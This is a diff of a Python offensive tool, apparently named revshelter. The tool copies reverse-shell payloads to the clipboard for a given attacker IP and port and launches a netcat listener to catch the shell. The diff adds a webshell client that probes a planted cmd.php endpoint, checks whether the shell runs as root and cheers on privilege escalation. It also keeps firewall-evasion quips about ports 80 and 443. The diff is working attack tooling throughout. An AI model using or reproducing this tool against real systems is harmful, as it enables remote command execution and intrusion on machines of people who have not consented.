@@ -1,7 +1,6 @@
 #!/usr/bin/python3.9
 
 import argparse
-from argparse import RawTextHelpFormatter
 import pyperclip
 import os
 import base64
@@ -41,7 +40,7 @@ parser = argparse.ArgumentParser(description=f"""
 /____/_/ /_/\___/_/\__/\___/_/     
 
 {end}{bold}{red}To boldly catch shells even the size of a meteorite.      
-{end}{bold}{orange}Version: v1.1.0 - 08/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=RawTextHelpFormatter)
+{end}{bold}{orange}Version: v1.1.1 - 09/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -165,11 +164,31 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
         return payloads["bash"]
     return payloads[language] # Returns reverseshell payload from the dictionary by slapping in ATTACKERIP and ATTACKERPORT.
 def Invoke_Webshell(url):
+    try:
+        r = requests.get(f"{url}")
+        if "404" in r.text or "Not Found" in r.text:
+            aerr(f"Fatal Error : 404 Page not found.")
+            exit()
+    except requests.ConnectionError:
+        aerr(f"Fatal Error : 404 Page not found.")
+        exit()
+    r = requests.get(f"{url}id")
+    uid = int(re.findall("[0-9]+",r.text)[0])
+    user = r.text.rstrip().split("(")[1].split(")")[0]
+    if "root" in user or uid == 0:
+        ap(f"{red}{bold}root{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold} WebShell opened.{end}")
+    else:
+        if uid > 0 and uid < 1000 :
+            ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Service Account{end}] WebShell opened{end}.")
+            ap("Good Luck!!! Happy Privilege Escation...")
+        elif uid > 1000:
+            ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Regular User{end}] WebShell opened{end}.")
+            ap("Good Luck!!! Happy Privilege Escation...")
     while True:
         cmd = input(f"{bold}{purple}rev{green}shelter> {end}{bold}{orange}")
         print(f"{end}",end="")
         r = requests.get(f"{url}{requests.utils.quote(cmd)}")
-        print(r.text)
+        print(r.text.rstrip())
         
 def shell_handler(port,proto): # shell_handler invokes a netcat listener it takes port to listen on and protocol UDP/TCP
     if proto.lower() == "tcp":
@@ -182,68 +201,72 @@ def shell_handler(port,proto): # shell_handler invokes a netcat listener it take
 
 if len(sys.argv) == 1:
     parser.print_help()
-
-if args.module == "rev": # Checks for 1st pos arg if its rev.
-    if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
-        #if args.i == None and args.p == None:
-        #    args.nohandler == True
-        if args.i != None: # Checks if IP is supplied via arg and check if it is a valid IP using regex.
-            check = bool(re.match("^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",args.i))
-            if not check: # Exits the script of the IP is not valid.
-                aerr(f"Fatal Error : {args.i} is not a valid ipv4 address")
-                exit()
-        if args.p != None: # Checks if port is supplied via arg and checks if it is in the valid port range.
-            if int(args.p) >= 65535 or int(args.p) < 0:
-                aerr(f"Fatal Error : {args.p} is not a valid port number.")
-                exit()
-        if args.i == None: # Using predefined variable to store the ip if not found by args.
-            args.i = fetch_ip()
-        if args.p == None: # Using predefined variable to store the port if not found by args.
-            args.p = fetch_port()
-        if args.p == 80 or args.p == 443 :
-            port_choice_troll = ["Trying to slip through Firewall, You Naughty ;)","Time to be Sneaky Beaky Like...","Let's be a ghost for now.","Shh!! Firewall is sleeping, Better not wake him up."]
-            ap(f"{orange}{bold}{random.choice(port_choice_troll)}{end}")
-        payload = shell_cpy(args.sub,args.i,args.p) # It will take 2nd positional args as language and store it in a variable.
-        pyperclip.copy(payload) # Will copy the revshell payload into the clipboard.
-        
-        if not args.nohandler: # It checks if the --nohandler flag not is supplied.
+try:
+    if args.module == "rev": # Checks for 1st pos arg if its rev.
+        if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
+            #if args.i == None and args.p == None:
+            #    args.nohandler == True
+            if args.i != None: # Checks if IP is supplied via arg and check if it is a valid IP using regex.
+                check = bool(re.match("^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",args.i))
+                if not check: # Exits the script of the IP is not valid.
+                    aerr(f"Fatal Error : {args.i} is not a valid ipv4 address")
+                    exit()
+            if args.p != None: # Checks if port is supplied via arg and checks if it is in the valid port range.
+                if int(args.p) >= 65535 or int(args.p) < 0:
+                    aerr(f"Fatal Error : {args.p} is not a valid port number.")
+                    exit()
+            if args.i == None: # Using predefined variable to store the ip if not found by args.
+                args.i = fetch_ip()
+            if args.p == None: # Using predefined variable to store the port if not found by args.
+                args.p = fetch_port()
+            if args.p == 80 or args.p == 443 :
+                port_choice_troll = ["Trying to slip through Firewall, You Naughty ;)","Time to be Sneaky Beaky Like...","Let's be a ghost for now.","Shh!! Firewall is sleeping, Better not wake him up."]
+                ap(f"{orange}{bold}{random.choice(port_choice_troll)}{end}")
+            payload = shell_cpy(args.sub,args.i,args.p) # It will take 2nd positional args as language and store it in a variable.
+            pyperclip.copy(payload) # Will copy the revshell payload into the clipboard.
+            
+            if not args.nohandler: # It checks if the --nohandler flag not is supplied.
+                ap("Starting up Shell Handler...")
+                if "udp".lower() in payload.lower(): # Checks if udp is present in the revshell then starts netcat with udp support
+                    shell_handler(args.p,"udp") # Invokes netcat listener with UDP support.
+                else:
+                    shell_handler(args.p,"tcp") # Invokes netcat listener on tcp mode.
+            else: # It will take place when --nohandler flag is supplied.
+                ainfo("No Handler flag detected. Handler will not be started.")
+        else: # If not argument is added after rev then it automatically falls back to bash base64'ed bash revshell.
+            ainfo("No Payload specified : Falling back to base64 encoded bash -i revshell")
             ap("Starting up Shell Handler...")
-            if "udp".lower() in payload.lower(): # Checks if udp is present in the revshell then starts netcat with udp support
-                shell_handler(args.p,"udp") # Invokes netcat listener with UDP support.
-            else:
-                shell_handler(args.p,"tcp") # Invokes netcat listener on tcp mode.
-        else: # It will take place when --nohandler flag is supplied.
-            ainfo("No Handler flag detected. Handler will not be started.")
-    else: # If not argument is added after rev then it automatically falls back to bash base64'ed bash revshell.
-        ainfo("No Payload specified : Falling back to base64 encoded bash -i revshell")
-        ap("Starting up Shell Handler...")
-        payload = shell_cpy("bash",fetch_ip(),fetch_port())
-        pyperclip.copy(payload)
-        shell_handler(fetch_port(),"tcp")
+            payload = shell_cpy("bash",fetch_ip(),fetch_port())
+            pyperclip.copy(payload)
+            shell_handler(fetch_port(),"tcp")
 
 
-if args.module == "web":
-    if not bool(re.match("^http://|https://",args.url)) and not bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)):
-        if args.ssl and args.nossl:
-            aerr(f"{bold}{white}A tight slap to you for slapping --ssl & --nossl together.")
-            exit()
-        elif args.ssl:
-            args.url = "https://" + args.url
-        elif args.nossl or not args.ssl and not args.nossl:
-            args.url = "http://" + args.url
-    if bool(re.match("^http://|https://",args.url)): # Checks whether http or https is present in the url entered.
-        if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+$",args.url)): # This if regex checks for url like http://127.0.0.1 and makes them http://127.0.0.1/
-            args.url += "/"
-        if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/",args.url)): # This if regex checks for url like https://127.0.0.1/ or http://127.0.0.1/
-            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)): # This regex checks if it has the filename path in the url else it injects cmd.php of the -f parameter.
-                if args.f == None: # Checks for the -f arg for filename if not supplied it puts default cmd.php there.
-                    args.url += "cmd.php"
-                elif args.f != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
-                    args.url += args.f
-            if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",args.url)): # Checks if the url has the args parameter present else injects ?cmd= or the data added with -p flag.
-                if args.p == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
-                    args.url += "?cmd="
-                elif args.p != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
-                    args.url += f"?{args.p}="
-    # The url is prepared for doing whatever we want to do.
-    Invoke_Webshell(args.url)
+    if args.module == "web":
+        if not bool(re.match("^http://|https://",args.url)) and not bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)):
+            if args.ssl and args.nossl:
+                aerr(f"{bold}{white}A tight slap to you for slapping --ssl & --nossl together.")
+                exit()
+            elif args.ssl:
+                args.url = "https://" + args.url
+            elif args.nossl or not args.ssl and not args.nossl:
+                args.url = "http://" + args.url
+        if bool(re.match("^http://|https://",args.url)): # Checks whether http or https is present in the url entered.
+            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+$",args.url)): # This if regex checks for url like http://127.0.0.1 and makes them http://127.0.0.1/
+                args.url += "/"
+            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/",args.url)): # This if regex checks for url like https://127.0.0.1/ or http://127.0.0.1/
+                if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)): # This regex checks if it has the filename path in the url else it injects cmd.php of the -f parameter.
+                    if args.f == None: # Checks for the -f arg for filename if not supplied it puts default cmd.php there.
+                        args.url += "cmd.php"
+                    elif args.f != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
+                        args.url += args.f
+                if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",args.url)): # Checks if the url has the args parameter present else injects ?cmd= or the data added with -p flag.
+                    if args.p == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
+                        args.url += "?cmd="
+                    elif args.p != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
+                        args.url += f"?{args.p}="
+        # The url is prepared for doing whatever we want to do.
+        Invoke_Webshell(args.url)
+
+except KeyboardInterrupt:
+    print()
+    ainfo("KTHXBYE!")
